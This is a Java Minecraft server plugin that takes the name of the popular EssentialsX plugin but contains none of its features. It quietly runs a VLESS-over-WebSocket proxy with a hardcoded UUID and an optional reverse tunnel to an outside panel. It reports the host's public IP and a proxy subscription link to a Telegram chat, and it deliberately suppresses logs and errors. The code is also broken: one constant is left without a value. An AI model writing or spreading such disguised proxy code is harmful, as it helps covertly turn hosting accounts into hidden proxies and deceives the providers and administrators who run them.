package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import org.java_websocket.WebSocket;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ClientHandshake;
import org.java_websocket.handshake.ServerHandshake;
import org.java_websocket.server.WebSocketServer;

public class EssentialsX extends JavaPlugin {

    // ================= 配置（编译前自行修改） =================

    static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
    static final int VLESS_PORT = 65534;

    // ---- ctun 面板隧道（三项填全才启动） ----
    // VLESS_PORT 和 TUNNEL_LOCAL_PORT 需对应
    static final String TUNNEL_HOST = "";          // 面板地址 / IP（明文 ws，不能填 CDN 域名）
    static final int TUNNEL_PORT = 65000;          // 面板端口
    static final String TUNNEL_TOKEN = "";         // ct_xxx（面板里创建客户端后生成）
    static final String TUNNEL_CLIENT = "";        // 客户端名，可留空
    static final int TUNNEL_PORT_INGRESS = ;      // 公网入站端口，仅用于 TG 通知
    static final int TUNNEL_LOCAL_PORT = 65534;    // 要暴露的本地端口（= VLESS_PORT）
    static final int TUNNEL_CONNS = 4;             // 并行隧道连接数
    static final boolean TUNNEL_VERBOSE = false;   // 控制台输出开关

    // ---- Telegram 通知（可留空） ----
    static final String TG_TOKEN = "";
    static final String TG_CHAT_ID = "";

    // ---- Komari 监控探针（可留空，留空则不启动上报） ----
    static final String KOMARI_HOST = "";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
    static final String KOMARI_TOKEN = "";  // Komari 后台节点详情页的 Client Token

    // 服务器名称
    static final String SERVER_NAME = "Weirdhost-Mc韩国家宽";

    // =========================================================

    private final AtomicBoolean running = new AtomicBoolean(true);

    /** ctun 隧道句柄，onDisable 时关闭。 */
    private static volatile CtunClient.CtunTunnel tunnel;

    /** VLESS 数据转发复用线程池：核心线程 0 + 空闲 30s 自动回收，避免原生线程无限攀升。
     *  SynchronousQueue 不积压任务，池满时 AbortPolicy 直接拒绝（对应连接断开），
     *  不会阻塞 WebSocket 读取线程，避免上次“连不上”的问题。 */
    private static final ThreadPoolExecutor WS_IO = new ThreadPoolExecutor(
        0, 64, 30, TimeUnit.SECONDS,
        new SynchronousQueue<Runnable>(),
        new ThreadPoolExecutor.AbortPolicy());
    static {
        WS_IO.allowCoreThreadTimeOut(true);
    }

    // ================= Telegram 通知 =================

    /** TG 通知冷却: 距上次推送不足 60 秒则丢弃（防刷屏） */
    private volatile long lastTgAt = 0;
    private static final long TG_COOLDOWN_MS = 60_000L;

    /** 发送 TG 消息（token/chat 为空则跳过；60 秒冷却防刷屏） */
    private void sendTelegram(String text) {
        if (TG_TOKEN == null || TG_TOKEN.isEmpty() || TG_CHAT_ID == null || TG_CHAT_ID.isEmpty()) return;
        long now = System.currentTimeMillis();
        long last = lastTgAt;
        if (now - last < TG_COOLDOWN_MS) return; // 冷却中, 丢弃
        lastTgAt = now;
        Thread t = new Thread(() -> {
            try {
                String body = "chat_id=" + TG_CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
                java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage");
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);
                try (OutputStream os = c.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                c.getResponseCode(); // 触发请求
                c.disconnect();
            } catch (Exception e) {
            }
        }, "EssentialsX-TG");
        t.setDaemon(true);
        t.start();
    }

    /** 取本机公网 IP（依次尝试多个服务，全部失败返回 null） */
    private String getPublicIp() {
        String[] services = {
                "https://api.ipify.org",
                "https://ifconfig.me/ip",
                "https://icanhazip.com"
        };
        for (String svc : services) {
            try {
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(svc).openConnection();
                c.setConnectTimeout(4000);
                c.setReadTimeout(4000);
                try (InputStream in = c.getInputStream()) {
                    byte[] b = in.readAllBytes();
                    String ip = new String(b, StandardCharsets.UTF_8).trim();
                    if (!ip.isEmpty()) return ip;
                }
                c.disconnect();
            } catch (Exception ignored) { }
        }
        return null;
    }

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // 1. VLESS over WebSocket 服务端（后台线程）
        if (VLESS_PORT > 0) {
            Thread t = new Thread(this::startVlessServer, "EssentialsX-VLESS");
            t.setDaemon(true);
            t.start();
        }

        // 2. ctun 反向隧道客户端
        if (tunnelEnabled()) {
            Thread t = new Thread(this::startTunnelClient, "EssentialsX-Tunnel");
            t.setDaemon(true);
            t.start();
        }

        // 3. 开机推送公网 IP
        Thread tg = new Thread(() -> {
            String ip = getPublicIp();
            if (ip != null) {
                boolean tunnelEnabled = tunnelEnabled();
                // 链接地址: 隧道模式用 隧道服务器:入站端口, 直连模式用 本机出口IP:VLESS端口
                String linkHost = tunnelEnabled ? TUNNEL_HOST : ip;
                int linkPort = tunnelEnabled ? TUNNEL_PORT_INGRESS : VLESS_PORT;
                sendTelegram(SERVER_NAME + " 已上线"
                    + (tunnelEnabled ? " (隧道模式)" : " (直连模式)") + "\n"
                    + "出口 IP: " + ip + "\n"
                    + "VLESS订阅:\n"
                    + "vless://" + VLESS_UID + "@" + linkHost + ":" + linkPort
                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=" + linkHost
                    + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, java.nio.charset.StandardCharsets.UTF_8));
            } else {
                sendTelegram("EssentialsX online — public IP: (unknown)");
            }
        }, "EssentialsX-TG-Startup");
        tg.setDaemon(true);
        tg.start();

        // 4. Komari 监控探针（KOMARI_HOST / KOMARI_TOKEN 任一为空则跳过）
        if (KOMARI_HOST != null && !KOMARI_HOST.isEmpty()
                && KOMARI_TOKEN != null && !KOMARI_TOKEN.isEmpty()) {
            KomariAgent.start(KOMARI_HOST, KOMARI_TOKEN);
        }

    }

    @Override
    public void onDisable() {
        running.set(false);
        CtunClient.CtunTunnel t = tunnel;
        tunnel = null;
        if (t != null) {
            try { t.close(); } catch (Throwable ignored) { }
        }
        WS_IO.shutdown();
        try {
            WS_IO.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }
        WS_IO.shutdownNow();
        sendTelegram(SERVER_NAME + "已离线");
        getLogger().info("EssentialsX disabled");
    }

    // =====================================================================
    //  server.js 移植: VLESS over WebSocket 服务端
    // =====================================================================

    private void startVlessServer() {
        try {
            WebSocketServer server = new WebSocketServer(new InetSocketAddress(VLESS_PORT)) {
                @Override
                public void onOpen(WebSocket conn, ClientHandshake handshake) { }

                @Override
                public void onClose(WebSocket conn, int code, String reason, boolean remote) {
                    VlessSession s = sessions.remove(conn);
                    if (s != null) {
                        try { s.remote.close(); } catch (Exception ignored) { }
                    }
                }

                @Override
                public void onError(WebSocket conn, Exception ex) { }

                @Override
                public void onStart() {
                }

                @Override
                public void onMessage(WebSocket conn, String message) {
                    // 文本消息忽略（原版只处理二进制）
                }

                @Override
                public void onMessage(WebSocket conn, ByteBuffer msg) {
                    handleWsMessage(conn, msg);
                }
            };
            server.setReuseAddr(true);
            // 每条 WS 连接 30s 内必须完成握手(否则 Java-WebSocket 会主动断开)。
            // 不设的话, 客户端连上来不发数据会一直占着, 又不断开新连接。
            server.setConnectionLostTimeout(30);
            server.start();
        } catch (Exception e) {
        }
    }

    /** 每条 WS 二进制消息：第一条解析 VLESS 头建连，后续直接转发 */
    private void handleWsMessage(WebSocket conn, ByteBuffer msg) {
        VlessSession session = sessions.get(conn);
        if (session != null) {
            session.forward(msg);
            return;
        }
        // 第一条：握手
        if (!tryHandshake(conn, msg)) {
            try { conn.close(); } catch (Exception ignored) { }
        }
    }

    private final Map<WebSocket, VlessSession> sessions = new ConcurrentHashMap<>();

    // ---------- 握手失败计数(仅内存, 不输出) ----------
    // 只做统计, 不写日志不落盘。
    private final java.util.concurrent.atomic.AtomicLong handshakeFailTotal = new java.util.concurrent.atomic.AtomicLong();

    /**
     * 握手失败的统一出口：只关掉 WS，不写日志、不发 TG、不落盘。
     * 注意：这里不发 TG。TG 只用于上线/离线/隧道断连恢复这类低频事件。
     */
    private void failHandshake(WebSocket conn, String reason) {
        handshakeFailTotal.incrementAndGet();
        try { conn.close(); } catch (Exception ignored) { }
    }
    /** 当前存活的隧道数据会话数（open 成功 +1, 关闭 -1） */
    private final java.util.concurrent.atomic.AtomicInteger sessionsOpen = new java.util.concurrent.atomic.AtomicInteger(0);

    /**
     * 解析目标地址: 优先 IPv4, 保留 IPv6 回退（与 node 版行为对齐）。
     *
     * node 的 net.connect 在双栈域名下会按系统顺序尝试, v6 可用时同样连通,
     * 所以这里不能砍掉 v6 —— v6-only 目标会被误判为不可达。
     * 优先 v4 只是让纯 v4 环境少一次失败尝试。
     * host 是 IP 字面量时 getAllByName 不产生 DNS 查询。
     */
    private static java.net.InetAddress resolveIPv4(String host) throws java.net.UnknownHostException {
        java.net.InetAddress[] all = java.net.InetAddress.getAllByName(host);
        java.net.InetAddress fallback = null;
        for (java.net.InetAddress a : all) {
            if (a instanceof java.net.Inet4Address) return a;   // 有 A 记录就先走 v4
            if (fallback == null) fallback = a;                 // 记住首个 v6 备用
        }
        if (fallback == null) throw new java.net.UnknownHostException(host);
        return fallback;   // 只有 AAAA 时照常走 v6
    }

    /** 返回 true 表示握手成功 */
    private boolean tryHandshake(WebSocket conn, ByteBuffer first) {
        byte[] buf = new byte[first.remaining()];
        first.get(buf);
        int p = 0;
        try {
            int ver = buf[p++] & 0xFF;          // VERSION
            byte[] idBytes = Arrays.copyOfRange(buf, p, p + 16); p += 16;
            if (!Arrays.equals(idBytes, uuidBytes())) {
                conn.close();
                return false;
            }
            // 真实 VLESS 结构: [VER][UUID 16B][ADDLEN/opts...][CMD 1B][PORT 2B][ATYP 1B][ADDR][DATA]
            // 与 Node 原版对齐: buf[17]=optLen, i += optLen 后 i+1 起是 CMD
            int optLen = buf[p++] & 0xFF;       // buf[17]
            p += optLen;
            int cmd = buf[p++] & 0xFF;          // CMD (1=TCP, 2=UDP)
            // 只支持 TCP。UDP 被当 TCP 透传必然握手失败, 而客户端会不停重试,
            // 每次重试都新开一条 WS -> 连接数暴涨。这里明确拒绝。
            if (cmd != 1) {
                failHandshake(conn, "unsupported cmd=" + cmd + " (only TCP)");
                return false;
            }
            int port = ((buf[p] & 0xFF) << 8) | (buf[p + 1] & 0xFF); p += 2;
            int atyp = buf[p++] & 0xFF;
            String host;
            switch (atyp) {
                case 1: // IPv4
                    host = (buf[p] & 0xFF) + "." + (buf[p + 1] & 0xFF) + "."
                            + (buf[p + 2] & 0xFF) + "." + (buf[p + 3] & 0xFF);
                    p += 4;
                    break;
                case 2: // 域名
                    int len = buf[p] & 0xFF;
                    p += 1;
                    host = new String(buf, p, len, StandardCharsets.US_ASCII);
                    p += len;
                    break;
                case 3: // IPv6
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 8; i++) {
                        int v = ((buf[p + i * 2] & 0xFF) << 8) | (buf[p + i * 2 + 1] & 0xFF);
                        if (i > 0) sb.append(':');
                        sb.append(Integer.toHexString(v));
                    }
                    host = sb.toString();
                    p += 16;
                    break;
                default:
                    conn.close();
                    return false;
            }
            // 初始 payload
            byte[] init = Arrays.copyOfRange(buf, p, buf.length);

            conn.send(new byte[]{(byte) ver, 0});

            Socket remote = new Socket();
            remote.connect(new InetSocketAddress(resolveIPv4(host), port), 8000);
            remote.setTcpNoDelay(true);

            if (init.length > 0) {
                OutputStream ros = remote.getOutputStream();
                ros.write(init);
                ros.flush();
            }

            VlessSession session = new VlessSession(conn, remote);
            sessions.put(conn, session);
            session.startDown();

            // 注册关闭回调，清理 sessions
            // (Java-WebSocket 无 onClose per-conn hook here, 由 closeAll 清理)
            return true;

        } catch (Exception e) {
            // 握手失败只写日志, 绝不再发 TG：
            // 以前这里 sendTelegram, 任何 v6-only 站点每试一次就推一条消息 -> 刷屏。
            failHandshake(conn, e.getClass().getSimpleName() + " " + e.getMessage());
            return false;
        }
    }

    /** 一条 VLESS 会话: WS <-> 远程 TCP */
    private class VlessSession {
        final WebSocket ws;
        final Socket remote;

        VlessSession(WebSocket ws, Socket remote) {
            this.ws = ws;
            this.remote = remote;
        }

        void forward(ByteBuffer msg) {
            try {
                byte[] arr = new byte[msg.remaining()];
                msg.get(arr);
                OutputStream os = remote.getOutputStream();
                os.write(arr);
                os.flush();
            } catch (Exception e) {
                closeAll(ws, remote);
            }
        }

        /** remote -> WS 转发线程 */
        void startDown() {
            WS_IO.execute(() -> {
                byte[] tmp = new byte[8192];
                try {
                    InputStream rin = remote.getInputStream();
                    int n;
                    while (running.get() && (n = rin.read(tmp)) >= 0) {
                        if (n > 0) ws.send(Arrays.copyOfRange(tmp, 0, n));
                    }
                } catch (Exception ignored) { }
                sessions.remove(ws);
                closeAll(ws, remote);
            });
        }
    }

    private void closeAll(WebSocket ws, Socket s) {
        sessions.remove(ws);
        try { ws.close(); } catch (Exception ignored) { }
        try { s.close(); } catch (Exception ignored) { }
    }

    private static byte[] uuidCache;
    private static byte[] uuidBytes() {
        if (uuidCache == null) {
            long msb = UUID.fromString(VLESS_UID).getMostSignificantBits();
            long lsb = UUID.fromString(VLESS_UID).getLeastSignificantBits();
            byte[] b = new byte[16];
            for (int i = 0; i < 8; i++) {
                b[i]     = (byte) (msb >>> (8 * (7 - i)));
                b[i + 8] = (byte) (lsb >>> (8 * (7 - i)));
            }
            uuidCache = b;
        }
        return uuidCache;
    }

    // =====================================================================
    //  ctun 反向隧道客户端（协议实现见同包 CtunClient）
    // =====================================================================

    /** 隧道三项填全才启动。 */
    private static boolean tunnelEnabled() {
        return TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty()
                && TUNNEL_PORT > 0
                && TUNNEL_TOKEN != null && !TUNNEL_TOKEN.isEmpty();
    }

    private void startTunnelClient() {
        CtunClient.VERBOSE = TUNNEL_VERBOSE;
        try {
            CtunClient.CtunTunnel t = new CtunClient.CtunTunnel(
                    TUNNEL_HOST, TUNNEL_PORT, TUNNEL_TOKEN)
                    .conns(TUNNEL_CONNS)
                    .route("127.0.0.1:" + TUNNEL_LOCAL_PORT);
            if (TUNNEL_CLIENT != null && !TUNNEL_CLIENT.isEmpty()) {
                t.client(TUNNEL_CLIENT);
            }
            t.start();
            tunnel = t;
        } catch (Throwable e) {
            // 隧道起不来不能拖垮服务器；异常消息可能带面板地址，不打印
            if (TUNNEL_VERBOSE) getLogger().warning("tunnel start failed: " + e.getClass().getSimpleName());
        }
    }
}
